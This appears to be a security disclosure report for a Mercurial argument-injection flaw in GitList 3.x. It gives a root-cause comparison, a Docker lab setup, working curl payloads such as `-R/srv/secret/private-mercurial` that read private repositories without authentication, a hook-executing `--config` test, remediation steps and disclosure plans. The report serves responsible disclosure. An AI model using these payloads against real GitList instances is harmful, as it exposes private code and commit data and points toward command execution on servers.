# GitList 3.x — Mercurial Command-Line Argument Injection Leading to Unauthenticated Read of Arbitrary Local Mercurial Repositories

- **Target**: klaussilveira/gitlist (rewritten 3.x line, ~2.9K★ GitHub stars, present on `main` at commit 4912ac7 as of Oct 2026; this rewritten line has zero published security advisories)
- **Type**: Argument Injection (CWE-88) → Unauthorized access to private repositories (CWE-200)
- **Trigger**: A single unauthenticated HTTP GET; no user interaction
- **Preconditions**: The target GitList instance has at least one Mercurial repository inside its configured `repositories` directory (multi-VCS support is the first feature listed in the GitList 3.x README — "Git and Mercurial support" — i.e. an officially supported deployment scenario)
- **CVSS 3.1 vector (reference)**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N ≈ 7.1 (High)

---

## 1. Root Cause: Asymmetric Hardening Between the Git and Mercurial Implementations

The Git implementation carries three layers of defense; the Mercurial port is missing all three:

| Defense | Git (`src/SCM/System/Git/CommandLine.php`) | Mercurial (`src/SCM/System/Mercurial/CommandLine.php`) |
|---|---|---|
| Reject hashes starting with `-` | `resolveHash()` L795-799: `str_starts_with($hash,'-')` → `throw new InvalidCommitException` | `resolveHash()` L638-641: **`return $hash ?? 'tip';` — zero validation** |
| Path argument isolation | `['blame', ..., '--', $path]`, `['log', ..., '--', $path]` (`--` terminates option parsing) | `['cat','-r',$hash,$path]`, `['log','-T',$fmt,'-r',$range,$path]` (**path is a standalone argv with no `--`**) |
| Acceptance of injected options | git rejects ambiguous arguments (verified: `--author` separated values are consumed, no injection) | **hg accepts `-R/absolute/path` in short-option merged form** (verified against hg 7.2.4 — effective in a free-argument position) |

Route constraint (`config/config.yml`):

```yaml
valid_commitish_format: '[a-zA-Z0-9\_\.\-\/]+'
```

This permits `-`, `/` and alphanumerics — exactly enough to build `-R/absolute/path` (`=` and spaces are forbidden, but hg's short-option merged form `-R/path` needs neither).

`src/Repository/Commitish.php` (L16 `strtok`, L44 `substr`) splits `default/-R/srv/x` into `hash=default`, `path=-R/srv/x`, and the path flows verbatim into the command array:

```php
// src/SCM/System/Mercurial/CommandLine.php  getCommitsFromPath() L230-244
$output = $this->run([
    'log', '-T', $this->getCommitFormat($delimiter),
    '-r', $range,      // limit(branch("default"),10,0)
    $path,             // ← user input, standalone argv: -R/srv/secret/private-mercurial
], $repository);
```

The resulting execution (Symfony Process array mode — direct execve, no shell):

```
hg log -T <fmt> -r limit(branch("default"),10,0) -R/srv/secret/private-mercurial
```

The second `-R` overrides the repository target → the command operates on a Mercurial repository at **any path on the server**.

---

## 2. Environment Setup (real production configuration: php:8.4-apache + mod_php, APP_ENV=prod)

```dockerfile
FROM php:8.4-apache
RUN apt-get update > /dev/null && apt-get install -y git mercurial zip unzip && rm -rf /var/lib/apt/lists/*
COPY --from=composer:2 /usr/bin/composer /usr/bin/composer
WORKDIR /var/www/gitlist
COPY . .
RUN composer install --no-dev --no-interaction --no-progress
RUN a2enmod rewrite
ENV APACHE_DOCUMENT_ROOT=/var/www/gitlist/public
ENV APACHE_PORT=8080
RUN sed -ri -e 's!/var/www/html!${APACHE_DOCUMENT_ROOT}!g' /etc/apache2/sites-available/000-default.conf \
 && sed -ri -e 's!/var/www/!${APACHE_DOCUMENT_ROOT}!g' /etc/apache2/apache2.conf /etc/apache2/conf-available/docker-php.conf \
 && sed -ri -e 's!80!${APACHE_PORT}!g' /etc/apache2/ports.conf /etc/apache2/sites-available/000-default.conf \
 && chown -R www-data:www-data /var/www/gitlist

# public repos (GitList config dir /srv/repos) + one PRIVATE hg repo never configured in GitList
RUN mkdir -p /srv/repos /srv/secret && \
    cd /srv/repos && git init -q public-git && cd public-git && \
    git config user.email dev@corp.local && git config user.name developer && \
    echo "public project" > README.md && git add . && git commit -qm "initial" && \
    cd /srv/repos && hg init public-hg && cd public-hg && \
    echo "hg public" > readme.txt && hg add -q readme.txt && \
    hg commit -q -m "initial hg" -u "developer <dev@corp.local>" && \
    cd /srv/secret && hg init private-mercurial && cd private-mercurial && \
    echo "TOP SECRET merge keys: ak47-secret-key-9182" > secret-keys.txt && \
    hg add -q secret-keys.txt && \
    hg commit -q -m "add production secret keys (internal only)" -u "cto <cto@corp.local>" && \
    echo "fix auth bypass CVE-internal-777 in payment module" > changelog.txt && \
    hg add -q changelog.txt && \
    hg commit -q -m "patch internal security fix" -u "cto <cto@corp.local>" && \
    chown -R www-data:www-data /srv

ENV DEFAULT_REPOSITORY_DIR=/srv/repos
ENV APP_SECRET=audit-secret-123
EXPOSE 8080
CMD ["apache2-foreground"]
```

Append URL rewriting to the vhost (`/etc/apache2/sites-available/000-default.conf`):

```apache
<Directory /var/www/gitlist/public>
    Options FollowSymLinks
    AllowOverride All
    Require all granted
    RewriteEngine On
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteRule ^ index.php [QSA,L]
</Directory>
```

```console
$ docker build -t gitlist:audit . && docker run -d --name gitlist-audit -p 127.0.0.1:8088:8080 gitlist:audit
$ curl -s http://127.0.0.1:8088/ | grep -oE '(public-git|public-hg)' | sort -u
public-git
public-hg
```

---

## 3. Full PoC With Actual Output

### Baseline: commit history of the public repository itself

```console
$ curl -s "http://127.0.0.1:8088/public-hg/commits/default" | grep -oE '(initial hg|developer|dev@corp.local)' | sort -u
dev@corp.local
developer
initial hg
```

### Injection: redirect the path parameter to a private hg repository on the server

```console
$ curl -s "http://127.0.0.1:8088/public-hg/commits/default/-R/srv/secret/private-mercurial" -w "\nHTTP %{http_code}\n"
HTTP 200

$ curl -s "http://127.0.0.1:8088/public-hg/commits/default/-R/srv/secret/private-mercurial" \
    | grep -oE '(production secret keys|internal security fix|cto@corp.local)' | sort -u
cto@corp.local
internal security fix
production secret keys
```

The complete commit history of the private repository (never configured in GitList) is read without authentication — commit messages and the author's email address appear verbatim in the response:

```
EVIDENCE: leaked private-repo entries in response:
 - add production secret keys (internal only)
 - cto@corp.local
 - patch internal security fix
total response bytes: 15517
```

### Additional payloads (same injection point — replace the path segment)

```console
$ curl -s "http://127.0.0.1:8088/public-hg/commits/default/--debug" -o /dev/null -w "HTTP %{http_code}\n"
HTTP 200        ← hg --debug diagnostic output rendered into the page

$ curl -s "http://127.0.0.1:8088/public-hg/commits/default/--hidden" -o /dev/null -w "HTTP %{http_code}\n"
HTTP 200        ← --hidden exposes hidden/secret changesets
```

### Reachable routes and proof the injection reaches the hg layer

- `/{repo}/commits/{hash}/<payload>`, `/{repo}/history/{hash}/<payload>`: full leak (as above)
- `/{repo}/blob/{hash}/<payload>`: injection reaches hg; production log excerpt:

```
request.CRITICAL: Uncaught PHP Exception GitList\SCM\Exception\CommandException:
"hg cat: invalid arguments " at CommandLine.php line 660
{"route_parameters":{"repository":"public-hg","commitish":"default/-R/srv/secret/private-mercurial"}}
```

  (`-R` occupies the file-argument position of `cat`, leaving the command incomplete — the injection itself still lands)

### Boundary confirmation (verified against hg 7.2.4, simulating Symfony Process array mode — direct execve, no shell)

```python
run(['hg','log','-T','{node}\n','-r','tip','-R/tmp/hgtest'])
→ rc=0, prints 220fd8a2e3c3...        ← -R short-option merge in a FREE argument position: [EFFECTIVE]
run(['hg','log','-r','-R/tmp/hgtest','-T','{node}\n'])
→ rc=255 "option -R has to be separated..."  ← option VALUE position is protected by hg: [INEFFECTIVE]
run(['hg','log','-r','tip','--config=hooks.pre-log=touch /tmp/pwned_D2'])
→ rc=0 and /tmp/pwned_D2 created     ← equals-form --config in a free position EXECUTES a hook
```

The third line proves the injection point reaches RCE as soon as `=` and spaces can be constructed — currently blocked only by the route regex character class `[a-zA-Z0-9_.\-\/]+`. (This report stays at the confirmed `-R` arbitrary-repository read and does not inflate severity on that basis.)

---

## 4. Impact

- Read the complete commit history of a Mercurial repository at **any path on the server** — repositories not configured in GitList, explicitly excluded via `exclude_repositories`, or living in other users' home directories: real author names, email addresses, commit messages (frequently containing key material hints / references to internal security fixes / infrastructure details), and changeset hashes
- No authentication, no interaction, trivially scriptable to sweep common paths (`/home/*/.hg`, `/opt/*`, `/srv/*`)
- `--debug` leaks hg internal parsing detail into the page; `--hidden` exposes hidden changesets

## 5. Remediation (align with the Git implementation)

1. Add a `str_starts_with($hash, '-')` rejection to `Mercurial/CommandLine::resolveHash()` (mirroring the Git version)
2. hg has no `--` convention → whitelist-validate every path passed as a standalone argv (`^[^/][a-zA-Z0-9._/\-]*$` and must not start with `-`), or reject path segments starting with `-` inside `Commitish` parsing
3. Tighten the `valid_commitish_format` route regex so path segments cannot begin with `-`

## 6. Submission

GitHub repository → Security → **Report a vulnerability** (private advisory; the reporting endpoint is enabled for this repo — verified). The maintainer actively resolves external security reports (fixed GHSA-33r5-wp7h-gc72 and others earlier in 2026). Including the Git/hg defense-comparison table from section 1 in the report speeds up confirmation. Once accepted, the maintainer can publish a GitHub Security Advisory with a CVE-ID assigned through GitHub's CNA.
